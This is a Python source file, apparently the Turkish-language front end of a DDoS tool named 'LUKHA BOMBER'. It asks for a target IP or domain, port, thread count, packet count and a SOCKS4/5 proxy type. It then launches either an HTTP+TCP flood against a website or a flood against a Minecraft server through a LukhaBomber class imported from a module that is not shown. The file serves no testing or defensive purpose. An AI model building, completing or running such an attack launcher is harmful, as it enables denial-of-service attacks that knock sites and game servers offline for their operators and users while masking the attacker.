import os
import sys
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
\033[91m
  _      _____ _   _ _______ _____  
 | |    |_   _| \ | |__   __|  __ \ 
 | |      | | |  \| |  | |  | |__) |
 | |      | | | . ` |  | |  |  ___/ 
 | |____ _| |_| |\  |  | |  | |     
 |______|_____|_| \_|  |_|  |_|     
\033[0m
\033[93m>>> Lukha Sizlere Sunar...<<<\033[0m
"""
    print(banner)

def main_menu():
    while True:
        clear()
        print_banner()
        print("╔════════════════════════╗")
        print("║      LUKHA BOMBER      ║")
        print("╠════════════════════════╣")
        print("║ 1. DDoS Saldırısı Başlat ║")
        print("║ 2. Gereksinimleri Yükle  ║")
        print("║ 3. Çıkış                 ║")
        print("╚════════════════════════╝")
        choice = input("\nSeçiminiz (1-3): ").strip()

        if choice == "1":
            start_attack()
        elif choice == "2":
            install_requirements()
        elif choice == "3":
            print("\nÇıkılıyor...")
            time.sleep(1)
            sys.exit()
        else:
            print("\n\033[91mGeçersiz seçim! Tekrar deneyin.\033[0m")
            time.sleep(1)

def install_requirements():
    clear()
    print_banner()
    print("\nGereksinimler yükleniyor, lütfen bekleyin...\n")
    os.system("pip install pysocks")
    print("\nYükleme tamamlandı!")
    input("\nDevam etmek için Enter'a basın...")

def start_attack():
    clear()
    print_banner()
    target = input("Hedef IP/Domain: ").strip()
    port_input = input("Port (default 80): ").strip()
    port = int(port_input) if port_input else 80
    threads_input = input("Thread sayısı (default 200): ").strip()
    threads = int(threads_input) if threads_input else 200
    total_requests_input = input("Gönderilecek toplam paket sayısı: ").strip()
    if not total_requests_input.isdigit():
        print("\n\033[91mGeçersiz sayı girdiniz!\033[0m")
        time.sleep(1)
        return
    total_requests = int(total_requests_input)
    proxy_type = input("Proxy türü (socks4/socks5): ").strip().lower()
    if proxy_type not in ["socks4", "socks5"]:
        print("\n\033[91mGeçersiz proxy tipi!\033[0m")
        time.sleep(1)
        return

    print("\nHedef türü seçin:")
    print("1. Site (HTTP + TCP Flood)")
    print("2. Minecraft Sunucusu")
    attack_choice = input("Seçiminiz (1 veya 2): ").strip()
    if attack_choice == "1":
        attack_target = "site"
    elif attack_choice == "2":
        attack_target = "minecraft"
        if port == 80:
            port = 25565
    else:
        print("\n\033[91mGeçersiz seçim!\033[0m")
        time.sleep(1)
        return

    # Burada lukha.py içindeki LukhaBomber sınıfını kullanabilirsin.
    from lukha import LukhaBomber
    bomber = LukhaBomber(target, port, threads, total_requests, proxy_type, attack_target)
    bomber.start()

if __name__ == "__main__":
    main_menu()
